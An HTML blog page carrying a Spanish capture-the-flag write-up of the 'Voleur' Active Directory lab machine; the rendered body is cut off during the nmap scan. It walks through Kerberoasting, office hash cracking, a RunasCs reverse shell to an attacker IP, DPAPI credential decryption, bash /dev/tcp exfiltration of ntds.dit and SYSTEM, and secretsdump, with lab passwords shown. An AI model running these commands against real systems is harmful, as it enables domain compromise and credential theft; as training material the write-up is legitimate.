<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Voleur | Cybersecurity Borhub Home</title>
<meta name="keywords" content="">
<meta name="description" content="Write-up sobre Voleur una m√°quina Active Directoy de dificultad Media. En la cual conseguiremos el pwn mediante credenciales durante la enumeraci√≥n de carpetas compartidas, la explotaci√≥n de permisos WriteAll y WriteSPN para realizar un kerberoast attack, restaurando objetos eliminados con powershell, obteniendo nuevas credenciales con archivos DPAPI y para acabar escalado privilegios gracias a un WSL parcialmente configurado.">
<meta name="author" content="">
<link rel="canonical" href="https://borhuub.github.io/write-ups/active_directory/medium/voleur/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.3f7c354717d256c925885357f6e3db263366c69483a88a7f441fa396c90d7330.css" integrity="sha256-P3w1RxfSVskliFNX9uPbJjNmxpSDqIp/RB&#43;jlskNczA=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://borhuub.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://borhuub.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://borhuub.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://borhuub.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://borhuub.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://borhuub.github.io/write-ups/active_directory/medium/voleur/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:url" content="https://borhuub.github.io/write-ups/active_directory/medium/voleur/">
  <meta property="og:site_name" content="Cybersecurity Borhub Home">
  <meta property="og:title" content="Voleur">
  <meta property="og:description" content="Write-up sobre Voleur una m√°quina Active Directoy de dificultad Media. En la cual conseguiremos el pwn mediante credenciales durante la enumeraci√≥n de carpetas compartidas, la explotaci√≥n de permisos WriteAll y WriteSPN para realizar un kerberoast attack, restaurando objetos eliminados con powershell, obteniendo nuevas credenciales con archivos DPAPI y para acabar escalado privilegios gracias a un WSL parcialmente configurado.">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="write-ups">
    <meta property="article:published_time" content="2025-11-01T01:00:00+00:00">
    <meta property="article:modified_time" content="2025-11-01T01:00:00+00:00">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Voleur">
<meta name="twitter:description" content="Write-up sobre Voleur una m√°quina Active Directoy de dificultad Media. En la cual conseguiremos el pwn mediante credenciales durante la enumeraci√≥n de carpetas compartidas, la explotaci√≥n de permisos WriteAll y WriteSPN para realizar un kerberoast attack, restaurando objetos eliminados con powershell, obteniendo nuevas credenciales con archivos DPAPI y para acabar escalado privilegios gracias a un WSL parcialmente configurado.">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Writeups",
      "item": "https://borhuub.github.io/write-ups/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Writeups AD - Dificultad",
      "item": "https://borhuub.github.io/write-ups/active_directory/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "Writeups AD - Nivel Medium",
      "item": "https://borhuub.github.io/write-ups/active_directory/medium/"
    }, 
    {
      "@type": "ListItem",
      "position":  4 ,
      "name": "Voleur",
      "item": "https://borhuub.github.io/write-ups/active_directory/medium/voleur/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Voleur",
  "name": "Voleur",
  "description": "Write-up sobre Voleur una m√°quina Active Directoy de dificultad Media. En la cual conseguiremos el pwn mediante credenciales durante la enumeraci√≥n de carpetas compartidas, la explotaci√≥n de permisos WriteAll y WriteSPN para realizar un kerberoast attack, restaurando objetos eliminados con powershell, obteniendo nuevas credenciales con archivos DPAPI y para acabar escalado privilegios gracias a un WSL parcialmente configurado.",
  "keywords": [
    
  ],
  "articleBody": "\nReconocimiento ‚ùØ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.76 -oG ports [sudo] contrase√±a para borhub: Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-05 22:41 +0200 Initiating SYN Stealth Scan at 22:41 Scanning 10.10.11.76 [65535 ports] Discovered open port 135/tcp on 10.10.11.76 Discovered open port 139/tcp on 10.10.11.76 Discovered open port 445/tcp on 10.10.11.76 Discovered open port 53/tcp on 10.10.11.76 Discovered open port 56867/tcp on 10.10.11.76 Discovered open port 56866/tcp on 10.10.11.76 Discovered open port 3268/tcp on 10.10.11.76 Discovered open port 49667/tcp on 10.10.11.76 Discovered open port 49664/tcp on 10.10.11.76 Discovered open port 2222/tcp on 10.10.11.76 Discovered open port 59455/tcp on 10.10.11.76 Discovered open port 88/tcp on 10.10.11.76 Discovered open port 9389/tcp on 10.10.11.76 Discovered open port 636/tcp on 10.10.11.76 Discovered open port 3269/tcp on 10.10.11.76 Discovered open port 389/tcp on 10.10.11.76 Discovered open port 464/tcp on 10.10.11.76 Discovered open port 56869/tcp on 10.10.11.76 Discovered open port 593/tcp on 10.10.11.76 Discovered open port 5985/tcp on 10.10.11.76 Discovered open port 56892/tcp on 10.10.11.76 Completed SYN Stealth Scan at 22:41, 26.40s elapsed (65535 total ports) Nmap scan report for 10.10.11.76 Host is up, received user-set (0.036s latency). Scanned at 2025-07-05 22:41:11 CEST for 26s Not shown: 65514 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 53/tcp open domain syn-ack ttl 127 88/tcp open kerberos-sec syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 139/tcp open netbios-ssn syn-ack ttl 127 389/tcp open ldap syn-ack ttl 127 445/tcp open microsoft-ds syn-ack ttl 127 464/tcp open kpasswd5 syn-ack ttl 127 593/tcp open http-rpc-epmap syn-ack ttl 127 636/tcp open ldapssl syn-ack ttl 127 2222/tcp open EtherNetIP-1 syn-ack ttl 127 3268/tcp open globalcatLDAP syn-ack ttl 127 3269/tcp open globalcatLDAPssl syn-ack ttl 127 5985/tcp open wsman syn-ack ttl 127 9389/tcp open adws syn-ack ttl 127 49664/tcp open unknown syn-ack ttl 127 49667/tcp open unknown syn-ack ttl 127 56866/tcp open unknown syn-ack ttl 127 56867/tcp open unknown syn-ack ttl 127 56869/tcp open unknown syn-ack ttl 127 56892/tcp open unknown syn-ack ttl 127 59455/tcp open unknown syn-ack ttl 127 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 26.45 seconds Raw packets sent: 131061 (5.767MB) | Rcvd: 33 (1.452KB) ‚ùØ ports.py ports üîç Puertos encontrados: ‚ûú 53 ‚ûú 88 ‚ûú 135 ‚ûú 139 ‚ûú 389 ‚ûú 445 ‚ûú 464 ‚ûú 593 ‚ûú 636 ‚ûú 2222 ‚ûú 3268 ‚ûú 3269 ‚ûú 5985 ‚ûú 9389 ‚ûú 49664 ‚ûú 49667 ‚ûú 56866 ‚ûú 56867 ‚ûú 56869 ‚ûú 56892 ‚ûú 59455 ¬°Puertos copiados en el portapapeles! ‚ùØ sudo nmap -sCV -p 53,88,135,139,389,445,464,593,636,2222,3268,3269,5985,9389,49664,49667,56866,56867,56869,56892,59455 10.10.11.76 -oN targeted Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-05 22:45 +0200 Nmap scan report for 10.10.11.76 Host is up (0.067s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-07-06 04:45:31Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 2222/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA) | 256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA) |_ 256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519) 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 49664/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 56866/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 56867/tcp open msrpc Microsoft Windows RPC 56869/tcp open msrpc Microsoft Windows RPC 56892/tcp open msrpc Microsoft Windows RPC 59455/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel Host script results: | smb2-security-mode: | 3.1.1: |_ Message signing enabled and required | smb2-time: | date: 2025-07-06T04:46:21 |_ start_date: N/A |_clock-skew: 7h59m49s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 100.99 seconds Autenticacion NTLM deshabilitada Al intentar comprobar las credenciales recibidas para iniciar la m√°quina, vemos que nos da como resultado STATUS_NOT_SUPPORTED adem√°s de que nos devuelve que NTLM:False.\nEsto quiere decir que o que el usuario tiene la autenticaci√≥n NTLM deshabilitada o que directamente no se permite la autenticaci√≥n NTLM en el dominio.\n‚ùØ nxc smb 10.10.11.76 -u 'ryan.naylor' -p 'HollowOct31Nyt' --shares SMB 10.10.11.76 445 10.10.11.76 [*] x64 (name:10.10.11.76) (domain:10.10.11.76) (signing:True) (SMBv1:False) (NTLM:False) SMB 10.10.11.76 445 10.10.11.76 [-] 10.10.11.76\\ryan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED Entonces sincronizamos nuestra m√°quina con ntpdate al dominio y luego probamos a autenticarnos mediante kerberos.\nsudo ntpdate -u 10.10.11.76 nxc ldap 10.10.11.76 -k -u 'ryan.naylor' -p 'HollowOct31Nyt' Configuraci√≥n krb5.conf Parece que vamos a tener que autenticarnos a trav√©s de Tickets Garanting Tickets (TGT) , con lo cual vamos a realizar la configuraci√≥n del archivo krb5.conf para que cuando intentemos auntenticarnos mediante kerberos encuentre el Key Distribution Center (KDC).\nsudo nano /etc/krb5.con [libdefaults] default_realm = VOLEUR.HTB ticket_lifetime = 24h renew_lifetime = 7d forwardable = true rdns = false [realms] VOLEUR.HTB = { kdc = DC.voleur.htb admin_server = DC.voleur.htb default_domain = voleur.htb } [domain_realm] .voleur.htb = VOLEUR.HTB voleur.htb = VOLEUR.HTB Una vez configurado el archivo krb5, con la herramienta getTGT.py voy a solicitar el Ticket Garanting Ticket (TGT) para el usuario ryan.naylor, que nos devolver√° un ticket en formato .ccache para luego nosotros exportarlo a la variable KRB5CCNAME.\ngetTGT.py voleur.htb/ryan.naylor:'HollowOct31Nyt' -dc-ip 10.10.11.76 export KRB5CCNAME=/home/borhub/Workspace/HTB/Voleur/CONTENT/ryan.naylor.ccache klist Enumeraci√≥n SMB + modulo spider_plus - nxc Ahora, vamos a ponerle a la variable FQDN el valor DC.voleur.htb, y luego realizaremos un escaneo a las carpetas comparitdas haciendo uso de nxc y la opci√≥n --use-kcache.\nexport FQDN=DC.voleur.htb nxc smb \"$FQDN\" --use-kcache --shares Vemos que tenemos varias carpetas no comunes como Finance, HR y IT, pero solo tenemos permiso de lectura con la carpeta IT, con lo cual vamos a enumerarla con el modulo spider_plus.\nnxc smb \"$FQDN\" --use-kcache --shares -M spider_plus cat /home/borhub/.nxc/modules/nxc_spider_plus/DC.voleur.htb.json | jq Vemos que dentro de la carpeta tenemos un archivo de excel llamado Acces_Review. Con lo cual nos lo descargamos con nxc usando --get-file.\nnxc smb \"$FQDN\" --use-kcache --share 'IT' --get-file 'First-Line Support/Access_Review.xlsx' Access_Review.xlsx Una vez tenemos el archivo nos lo abrimos, pero vemos que el archivo esta encriptado y necesitamos una contrase√±a para desbloaquearlo.\nExtrayendo y crackeando hash de un archivo protegido xlsx - Jhon Primero haciendo uso del script Office2Jhon extraemos el hash del archivo protegido.\n/opt/Herramientas/john/run/office2john.py Access_Review.xlsx \u003e hash-excel Ahora, vamos a craquear el hash obtenido usando el formato office.\njohn --format=office hash-excel /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt Una vez con la contrase√±a crackeada, desbloqueamos el archivo xlsx y vemos una tabla sobre los usuarios, permisos, estado de los usuarios y incluso algunas contrase√±as.\nBloodhound Enumeration Lanzamos el siguiente script de bloodhound-python para recabar toda la informaci√≥n posible del sistema, que luego usaremos en Bloodhound.\nbloodhound-python -u 'ryan.naylor' -k -no-pass -d VOLEUR.HTB -ns 10.10.11.76 -dc DC.voleur.htb -c all --zip --auth-method kerberos Una vez metido los datos en Bloodhound, y habiendo revisado los usuarios visto en el excel. Vemos que el siguiente paso a dar ser√° con svc_ldap del cual ademas tenemos una credencial en el apartado notas.\nComprobamos que las credenciales de svc_ldap sean validas. Y le sacamos un Ticket Garanting Ticket (TGT).\nnxc ldap 10.10.11.76 -k -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' getTGT.py voleur.htb/svc_ldap:'M1XyC9pW7qT5Vn' -dc-ip 10.10.11.76 export KRB5CCNAME=/home/borhub/Workspace/HTB/Voleur/CONTENT/svc_ldap.ccache Una vez con el TGT vamos a proceder a abusar de los permisos GenericWrite sobre el usuario lacey.miller y los permisos WriteSPN sobre svc_winrm lanzando un kerberoast attack.\nKerberoast Attack - tergetedKerberoast.py Lanzamos el comando usando el script targetedKerberoast.py.\n/opt/Herramientas/targetedKerberoast/targetedKerberoast.py --dc-ip 10.10.11.76 --dc-host DC.voleur.htb -d 'VOLEUR.HTB' -u 'svc_ldap' --no-pass -k Y vemos que tenemos los hashes Ticket Garanting Service (TGS) de los usuarios lacey.miller y de svc_winrm. Ahora, usando hashcat vamos a tratar de crackearlos para obtener ambas contrase√±as.\nhashcat hash_tgs /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt Vemos que la contrase√±a crackeada es AFireInsidedeOzarctica980219afi. Y iniciamos sesi√≥n a trav√©s de winrm. Con lo cual generamos el Ticket Garanting Ticket (TGT) y iniciamos sesi√≥n en la m√°quina.\nEn un principio intente hacer el ataque ShadowCredentials sobre el usuario lacey.miller, pero no estaba funcionando. Con lo cual seguramente el siguiente paso vaya por conseguir restaurar el usuario eliminado Todd.Wolfie que hab√≠amos visto anteriormente en la nota.\nShell como svc_ldap - Runascs.exe Nosotros en este caso tenemos una shell como el usuario svc_winrm , pero desde este usuario no tenemos los permisos Restore Objects que si tiene svc_ldap. Con lo cual haciendo uso de runascs.exe, vamos abrirnos una shell con runascs haciendo uso del usuario ldap.\nRunasCS es una herramienta que nos permite ejecutar diferentes procesos con los permisos obtenidos de las credenciales que le indicamos en el la linea de comando. Para empezar, vamos a subir a la m√°quina mediante upload el archivo RunasCs.exe.\n*Evil-WinRM* PS C:\\Users\\svc_winrm\\Documents\u003e upload ./RunasCs/RunasCs.exe Luego ejecutamos el siguiente comando:\n.\\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell.exe -r 10.10.15.254:4444 Restaurando usuario eliminado con Restore-ADObject Ahora con la shell recibida como el usuario svc_ldap, vamos a restaurar el usuario Todd.Wolfe. Primero comprobamos los objetos eliminados con Get-ADObject, entre ellos vemos al usuario que tenemos como objetivo.\nGet-ADObject -IncludeDeletedObjects -Filter {Isdeleted -eq $true} Ahora con el usuario identificado vamos a restaurarlo con Restore-ADObject.\nRestore-ADObject -Identity \"1c6b1deb-c372-4cbb-87b1-15031de169db\" -NewName \"Todd.Wolfe\" Movimiento Lateral - DPAPI Files Luego de estar mirando los permisos de Todd.Wolfe, no encuentro nada interesante es entonces cuando decido lanzar el winPEAS.exe. Luego de estar un rato mir√°ndolo, descubro que existen unas DPAPI Master Key Keys.\nAunque, aqu√≠ no nos valen estas credenciales ya que nos falta encontrar el archivo credentials file que es el que contiene las credenciales, con lo cual nos ponemos a enumerar los directorios del sistema. Estas son diferentes rutas donde pueden estar los archivos DPAPI almacenados, pero en este caso no los encontraremos aqu√≠.\nPosibles rutas donde se almacenan:\nC:\\Users\\username\\AppData\\Roaming\\Microsoft\\Protect\\* C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Credentials* C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Vault\\* Tambi√©n podemos cambiar \\Roaming\\ por \\Local\\ en las rutas. En los directorios del sistema encontramos la carpeta IT en C: y ah√≠ encontraremos el perfil archivado de Todd.Wolfie y los archivos DPAPI que busc√°bamos.\nC:\\IT\\Second-Line Support\\Archived Users\\todd.wolfe\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-3927696377-1337352550-2781715495-1110 C:\\IT\\Second-Line Support\\Archived Users\\todd.wolfe\\AppData\\Roaming\\Microsoft\\Credentials\\772275FAD58525253490A9B0039791D3 Entonces he probado a descargarme el Masterkey y Credentials files pero me daba el siguiente error:\nYou can‚Äôt access this shared folder because your organization‚Äôs security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.\nEsto pasa ya que algunas pol√≠ticas o por algunas versiones modernas de Windows no permiten la descarga de archivos de manera no autenticada, entonces he establecido un usuario y contrase√±a y me he conectado al servidor smb haciendo uso de ellas, ya luego he descargado los archivos.\nsudo smbserver.py smbFolder $(pwd) -username borhub -password borhub -smb2support net use x: \\\\10.10.15.254\\smbFolder /user:borhub borhub copy C:\\IT\\Second-Line Support\\Archived Users\\todd.wolfe\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-3927696377-1337352550-2781715495-1110 \\\\10.10.15.254\\smbFolder copy C:\\IT\\Second-Line Support\\Archived Users\\todd.wolfe\\AppData\\Roaming\\Microsoft\\Credentials\\772275FAD58525253490A9B0039791D3 \\\\10.10.15.254\\smbFolder\\ Y ahora ya tengo el archivo en mi maquina linux. Entonces procedo a desencryptar el archivo y me da la key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83\ndpapi.py masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -password 'NightT1meP1dg3on14' -sid S-1-5-21-3927696377-1337352550-2781715495-1110 Ahora tenemos tanto el archivo encryptado como la llave para descifrarlo, vamos a obtener las posibles credenciales que el archivo tenga almacenadas.\ndpapi.py credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83 Es entonces cuando descubrimos las credenciales de jeremy.combs. Y ahora, sacamos un Ticket Garanting Ticket (TGT) para este usuario, ya que hemos visto que tiene permisos de inicio de sesi√≥n remota y vamos a enumerar el sistema.\nEscalada de Privilegios Anteriormente hab√≠amos visto que la carpeta IT, estaba dividida en tres carpetas una para cada tipo de t√©cnico.\nSeguramente y como Jeremy es miembro de Third-Line Suppport, tendremos permisos para acceder a la carpeta de su grupo. Dentro de esa carpeta tenemos varios archivos e directorios interesantes. Enumer√°ndolos veo que no tengo permiso para acceder a la carpeta Backups, pero vamos a descargarnos los archivos id_rsa y Note.txt.txt.\nUsando download que nos da evilwinrm, nos los descargamos a nuestra m√°quina local. Si comprobamos que dice la nota de texto que hemos encontrado, vemos que el admin le dice a Jeremy que ha tenido suficiente con los backups de windows y que ha configurado parcialmente WSL para intentar utilizar alguna de las herramientas de copia de seguridad de Linux.\n[!Subsistema de Windows para Linux] WSL (Subsistema de Windows para Linux) es una caracter√≠stica de Windows que permite ejecutar un entorno Linux en una m√°quina Windows sin necesidad de una m√°quina virtual independiente o un dualboot.\nWSL redirige los puertos SSH a los puertos 2222, 22222, 2223. En el escaneo de puertos hab√≠amos visto que el puerto 2222 estaba abierto con lo cual vamos a iniciar sesi√≥n por ssh con la clave privada seguramente del usuario svc_backup que se mencionaba en el el archivo excel.\nchmod 600 id_rsa ssh -i id_rsa svc_backup@10.10.11.76 -p 2222 Abusando de WSL parcialmente configurado para obtener archivos sensibles Ahora si hacemos sudo su, vemos que tenemos la capacidad de ponernos como root. Y como WSL monta autom√°ticamente los discos de Windows en /mnt/ vamos a explorarlos.\nPrimero voy a empezar revisando la carpeta Backup a la cual antes no ten√≠amos permiso para acceder. En esa carpeta vemos tanto que tenemos tanto el archivo ntds.din como el archivo SYSTEM.\nntds.dit -\u003e Es el archivo que contiene todos los hashes del dominio. SYSTEM -\u003e Contiene la bootkey (clave maestra) que se usa para descrifrar los hashes almacenados en el archivo ntds.dit. Extracci√≥n de hashes NTLM/LM - secretsdump.py Con lo cual nos los descargamos usando los siguientes comandos:\n#Nos transferimos el contenido del ntds.dit a nuestra m√°quina usando cat y guardandolo en ntds.dit nc -lvnp 4444 \u003e ntds.dit bash -c 'cat ntds.dit \u003e /dev/tcp/10.10.15.254/4444' nc -lvnp 4444 \u003e SYSTEM bash -c 'cat SYSTEM \u003e /dev/tcp/10.10.15.254/4444' Ahora una vez descargados con secretsdump.py extraemos los hashes NTLM/LM.\nsecretsdump.py -ntds ntds.dit -system SYSTEM LOCAL Ahora con el hash NTLM/LM de Administrator le solicitamos el Ticket Garanting Ticket(TGT), lo exportamos y procedemos a iniciar sesi√≥n a trav√©s de evil-winrm como administradores del sistema.\n",
  "wordCount" : "2314",
  "inLanguage": "en",
  "datePublished": "2025-11-01T01:00:00Z",
  "dateModified": "2025-11-01T01:00:00Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://borhuub.github.io/write-ups/active_directory/medium/voleur/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Cybersecurity Borhub Home",
    "logo": {
      "@type": "ImageObject",
      "url": "https://borhuub.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://borhuub.github.io/" accesskey="h" title="Cybersecurity Borhub Home (Alt + H)">Cybersecurity Borhub Home</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://borhuub.github.io/" title="Inicio">
                    <span>Inicio</span>
                </a>
            </li>
            <li>
                <a href="https://borhuub.github.io/write-ups/" title="Write-Ups">
                    <span>Write-Ups</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      Voleur
    </h1>
    <div class="post-description">
      Write-up sobre Voleur una m√°quina Active Directoy de dificultad Media. En la cual conseguiremos el pwn mediante credenciales durante la enumeraci√≥n de carpetas compartidas, la explotaci√≥n de permisos WriteAll y WriteSPN para realizar un kerberoast attack, restaurando objetos eliminados con powershell, obteniendo nuevas credenciales con archivos DPAPI y para acabar escalado privilegios gracias a un WSL parcialmente configurado.
    </div>
    <div class="post-meta"><span title='2025-11-01 01:00:00 +0000 UTC'>November 1, 2025</span>

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#reconocimiento" aria-label="Reconocimiento">Reconocimiento</a></li>
                <li>
                    <a href="#autenticacion-ntlm-deshabilitada" aria-label="Autenticacion NTLM deshabilitada">Autenticacion NTLM deshabilitada</a><ul>
                        
                <li>
                    <a href="#configuraci%c3%b3n-krb5conf" aria-label="Configuraci√≥n krb5.conf">Configuraci√≥n krb5.conf</a></li>
                <li>
                    <a href="#enumeraci%c3%b3n-smb--modulo-spider_plus---nxc" aria-label="Enumeraci√≥n SMB &#43; modulo spider_plus - nxc">Enumeraci√≥n SMB + modulo spider_plus - nxc</a><ul>
                        
                <li>
                    <a href="#extrayendo-y-crackeando-hash-de-un-archivo-protegido-xlsx---jhon" aria-label="Extrayendo y crackeando hash de un archivo protegido xlsx - Jhon">Extrayendo y crackeando hash de un archivo protegido xlsx - Jhon</a></li></ul>
                </li></ul>
                </li>
                <li>
                    <a href="#bloodhound-enumeration" aria-label="Bloodhound Enumeration">Bloodhound Enumeration</a><ul>
                        
                <li>
                    <a href="#kerberoast-attack---tergetedkerberoastpy" aria-label="Kerberoast Attack - tergetedKerberoast.py">Kerberoast Attack - tergetedKerberoast.py</a></li>
                <li>
                    <a href="#shell-como-svc_ldap---runascsexe" aria-label="Shell como svc_ldap - Runascs.exe">Shell como svc_ldap - Runascs.exe</a></li>
                <li>
                    <a href="#restaurando-usuario-eliminado-con-restore-adobject" aria-label="Restaurando usuario eliminado con Restore-ADObject">Restaurando usuario eliminado con Restore-ADObject</a></li></ul>
                </li>
                <li>
                    <a href="#movimiento-lateral---dpapi-files" aria-label="Movimiento Lateral - DPAPI Files">Movimiento Lateral - DPAPI Files</a></li>
                <li>
                    <a href="#escalada-de-privilegios" aria-label="Escalada de Privilegios">Escalada de Privilegios</a><ul>
                        
                <li>
                    <a href="#abusando-de-wsl-parcialmente-configurado-para-obtener-archivos-sensibles" aria-label="Abusando de WSL parcialmente configurado para obtener archivos sensibles">Abusando de WSL parcialmente configurado para obtener archivos sensibles</a><ul>
                        
                <li>
                    <a href="#extracci%c3%b3n-de-hashes-ntlmlm---secretsdumppy" aria-label="Extracci√≥n de hashes NTLM/LM - secretsdump.py">Extracci√≥n de hashes NTLM/LM - secretsdump.py</a>
                </li>
            </ul>
            </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><p><img alt="Voleur Machine" loading="lazy" src="/write-ups/active_directory/medium/voleur/fotos/voleur_machine.png"></p>
<h1 id="reconocimiento">Reconocimiento<a hidden class="anchor" aria-hidden="true" href="#reconocimiento">#</a></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ sudo nmap -p- --open -sS --min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn 10.10.11.76 -oG ports
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> contrase√±a para borhub:
</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
</span></span><span style="display:flex;"><span>Starting Nmap 7.97 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-07-05 22:41 +0200
</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 22:41
</span></span><span style="display:flex;"><span>Scanning 10.10.11.76 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Discovered open port 135/tcp on 10.10.11.76
</span></span><span style="display:flex;"><span>Discovered open port 139/tcp on 10.10.11.76
